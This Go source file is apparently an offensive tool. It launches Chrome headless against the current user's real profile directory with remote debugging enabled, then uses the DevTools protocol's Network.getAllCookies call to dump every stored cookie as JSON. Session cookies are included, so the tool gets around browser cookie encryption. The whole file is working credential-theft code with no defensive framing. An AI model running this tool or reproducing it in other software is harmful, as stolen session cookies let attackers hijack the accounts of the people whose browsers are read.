package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/gorilla/websocket"
)

// Possible enhancement
// see https://github.com/chromedp/chromedp/blob/b6cbbcbe0381881e25336acaa16f8e6122a91296/examples/cookie/main.go

func main() {
	home, _ := os.LookupEnv("LOCALAPPDATA")
	// userDataDir := home + "/.config/google-chrome"
	userDataDir := home + `\Google\Chrome\User Data`
	// cmd := exec.Command("google-chrome", "--headless", "--user-data-dir="+userDataDir, "--remote-debugging-port=9222", "--no-sandbox")
	cmd := exec.Command(`C:\Program Files (x86)\Google\Chrome\Application\Chrome.exe`, "--headless", "--user-data-dir="+userDataDir, "--remote-debugging-port=9222", "--no-sandbox")

	err := cmd.Start()
	if err != nil {
		fmt.Printf("[!] could not start chrome: %v", err)
		return
	}
	time.Sleep(2 * time.Second)
	resp, err := http.Get("http://localhost:9222/json")
	if err != nil {
		fmt.Printf("[!] error contacting chrome debugger: %v", err)
		return
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	var result []map[string]interface{}
	err = json.Unmarshal(bodyBytes, &result)
	if err != nil {
		fmt.Printf("[!] error unmarshalling json: %v", err)
		return
	}
	websocketURL := fmt.Sprintf("%v", result[0]["webSocketDebuggerUrl"])
	conn, _, err := websocket.DefaultDialer.Dial(websocketURL, http.Header{})
	err = conn.WriteMessage(websocket.TextMessage, []byte("{\"id\": 1, \"method\": \"Network.getAllCookies\"}"))
	if err != nil {
		fmt.Printf("[!] could not write to websocket: %v", err)
		return
	}
	var data string
	go func() {
		for {
			msgType, buf, err := conn.ReadMessage()
			if err != nil {
				fmt.Printf("[!] could not read message: %v", err)
				break
			}
			if len(buf) == 0 {
				break
			}
			if msgType == websocket.TextMessage {
				data += string(buf)
			}
		}
	}()
	time.Sleep(1 * time.Second)
	cmd.Process.Kill()
	var buf bytes.Buffer
	err = json.Indent(&buf, []byte(data), "", " ")
	if err != nil {
		return
	}
	fmt.Println(buf.String())
}
